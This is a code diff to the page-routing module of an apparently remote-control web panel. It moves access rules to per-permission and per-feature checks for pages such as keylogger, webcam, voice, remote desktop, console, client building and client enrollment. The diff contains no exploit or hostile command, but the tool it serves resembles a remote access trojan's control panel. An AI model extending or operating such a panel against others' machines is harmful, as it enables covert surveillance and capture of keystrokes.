@@ -2,7 +2,7 @@ import { authenticateRequest } from "../../auth";
 import { getConfig } from "../../config";
 import { consumeLoginPageRateLimit } from "../../rateLimit";
 import { requirePermission, type Permission } from "../../rbac";
-import { canUserAccessClient, getUserById, type UserRole } from "../../users";
+import { canUserAccessClient, canUserAccessFeature, getUserById, type FeatureName, type UserRole } from "../../users";
 
 type PageRouteDeps = {
   PUBLIC_ROOT: string;
@@ -72,11 +72,15 @@ type ClientPageDef = {
   pattern: RegExp;
   file: string;
   clientIdGroup: number;
+  feature?: FeatureName;
+  permission?: Permission;
 };
 
 type QueryClientPageDef = {
   path: string;
   file: string;
+  feature?: FeatureName;
+  permission?: Permission;
 };
 
 /** Static pages: each entry maps a URL path to its HTML file + access rules. */
@@ -87,33 +91,33 @@ const STATIC_PAGES: StaticPageDef[] = [
   { path: "/settings",           file: "settings.html",            access: "any",              checkPasswordChange: true },
   { path: "/logs",               file: "logs.html",                access: "any",              checkPasswordChange: true, permission: "audit:view" },
   { path: "/notifications",      file: "notifications.html",       access: "admin-or-operator", checkPasswordChange: true },
-  { path: "/users",              file: "users.html",               access: "admin",            checkPasswordChange: true },
-  { path: "/user-client-access", file: "user-client-access.html",  access: "admin",            checkPasswordChange: true },
-  { path: "/build",              file: "build.html",               access: "admin-or-operator" },
-  { path: "/sol-publish",        file: "sol-publish.html",         access: "admin" },
-  { path: "/plugins",            file: "plugins.html",             access: "admin-or-operator" },
-  { path: "/scripts",            file: "scripts.html",             access: "no-viewer" },
-  { path: "/deploy",             file: "deploy.html",              access: "admin" },
+  { path: "/users",              file: "users.html",               access: "any",               checkPasswordChange: true, permission: "users:manage" },
+  { path: "/user-client-access", file: "user-client-access.html",  access: "any",               checkPasswordChange: true, permission: "users:manage" },
+  { path: "/build",              file: "build.html",               access: "any",               permission: "clients:build" },
+  { path: "/sol-publish",        file: "sol-publish.html",         access: "any",               permission: "system:configure" },
+  { path: "/plugins",            file: "plugins.html",             access: "any",               permission: "plugins:manage" },
+  { path: "/scripts",            file: "scripts.html",             access: "any",               permission: "scripts:manage" },
+  { path: "/deploy",             file: "deploy.html",              access: "any",               permission: "deploys:manage" },
   { path: "/socks5-manager",     file: "socks5-manager.html",      access: "no-viewer",        checkPasswordChange: true },
   { path: "/file-share",          file: "file-share.html",          access: "no-viewer",        checkPasswordChange: true },
-  { path: "/purgatory",          file: "purgatory.html",           access: "admin-or-operator", checkPasswordChange: true },
+  { path: "/purgatory",          file: "purgatory.html",           access: "any",              checkPasswordChange: true, permission: "clients:enroll" },
 ];
 
 /** Client-scoped pages accessed via query param ?clientId=... */
 const QUERY_CLIENT_PAGES: QueryClientPageDef[] = [
-  { path: "/remotedesktop", file: "remotedesktop.html" },
-  { path: "/webcam",        file: "webcam.html" },
-  { path: "/backstage",          file: "backstage.html" },
-  { path: "/voice",         file: "voice.html" },
-  { path: "/winre",         file: "winre.html" },
+  { path: "/remotedesktop", file: "remotedesktop.html", feature: "remote_desktop" },
+  { path: "/webcam",        file: "webcam.html",        feature: "webcam" },
+  { path: "/backstage",     file: "backstage.html",     feature: "backstage" },
+  { path: "/voice",         file: "voice.html",         feature: "voice" },
+  { path: "/winre",         file: "winre.html",         permission: "clients:winre" },
 ];
 
 /** Client-scoped pages accessed via path /:clientId/feature */
 const PATH_CLIENT_PAGES: ClientPageDef[] = [
-  { pattern: /^\/(.+)\/console$/,    file: "console.html",    clientIdGroup: 1 },
-  { pattern: /^\/(.+)\/files$/,      file: "filebrowser.html", clientIdGroup: 1 },
-  { pattern: /^\/(.+)\/processes$/,  file: "processes.html",  clientIdGroup: 1 },
-  { pattern: /^\/(.+)\/keylogger$/,  file: "keylogger.html",  clientIdGroup: 1 },
+  { pattern: /^\/(.+)\/console$/,    file: "console.html",     clientIdGroup: 1, feature: "console" },
+  { pattern: /^\/(.+)\/files$/,      file: "filebrowser.html", clientIdGroup: 1, feature: "file_browser" },
+  { pattern: /^\/(.+)\/processes$/,  file: "processes.html",   clientIdGroup: 1, feature: "processes" },
+  { pattern: /^\/(.+)\/keylogger$/,  file: "keylogger.html",   clientIdGroup: 1, feature: "keylogger" },
 ];
 
 function checkAccess(role: UserRole, access: AccessLevel): Response | null {
@@ -224,8 +228,17 @@ export async function handlePageRoutes(
     const maybeChange = await serveChangePasswordIfRequired(deps, user.userId);
     if (maybeChange) return maybeChange;
 
-    if (user.role === "viewer") {
-      return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
+    if (page.permission) {
+      try {
+        requirePermission(user, page.permission);
+      } catch (error) {
+        if (error instanceof Response) return error;
+        return new Response("Forbidden", { status: 403 });
+      }
+    }
+
+    if (page.feature && !canUserAccessFeature(user.userId, user.role, page.feature)) {
+      return new Response(`Forbidden: feature access denied for ${page.feature}`, { status: 403 });
     }
 
     const clientId = (url.searchParams.get("clientId") || "").trim();
@@ -244,8 +257,17 @@ export async function handlePageRoutes(
     const user = await authenticateRequest(req);
     if (!user) return serveLoginOrUnauthorized(req, deps);
 
-    if (user.role === "viewer") {
-      return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
+    if (page.permission) {
+      try {
+        requirePermission(user, page.permission);
+      } catch (error) {
+        if (error instanceof Response) return error;
+        return new Response("Forbidden", { status: 403 });
+      }
+    }
+
+    if (page.feature && !canUserAccessFeature(user.userId, user.role, page.feature)) {
+      return new Response(`Forbidden: feature access denied for ${page.feature}`, { status: 403 });
     }
 
     const clientId = match[page.clientIdGroup];
